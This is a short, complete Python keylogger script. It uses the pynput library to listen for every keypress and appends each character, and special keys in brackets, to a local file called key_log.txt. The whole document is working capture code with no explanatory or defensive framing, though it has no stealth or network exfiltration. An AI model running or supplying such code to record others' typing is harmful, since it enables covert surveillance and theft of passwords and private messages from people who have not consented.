from pynput.keyboard import Listener

# File to store logged keys
LOG_FILE = "key_log.txt"

# Function to log keystrokes
def log_keystroke(key):
    with open(LOG_FILE, "a") as log_file:
        try:
            # Log the key pressed
            log_file.write(f"{key.char}")
        except AttributeError:
            # Handle special keys like 'space', 'enter', etc.
            log_file.write(f"[{key}]")

# Start the listener
with Listener(on_press=log_keystroke) as listener:
    listener.join()
